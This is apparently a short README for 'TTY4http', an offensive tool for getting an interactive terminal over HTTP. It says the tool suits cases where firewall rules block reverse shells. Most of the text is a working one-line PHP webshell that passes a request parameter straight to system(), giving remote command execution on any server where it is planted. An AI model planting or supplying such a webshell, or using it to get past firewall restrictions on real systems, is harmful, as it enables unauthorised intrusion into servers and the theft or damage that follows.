# TTY4http

Usando una webshell basica:
```php
// webshell
<?php 
    system($_REQUEST['cmd']); 
?>
```
Obtain a tty by http, ideal for when iptables reblas are implemented, preventing the option of a reverse shell by tcp or udp.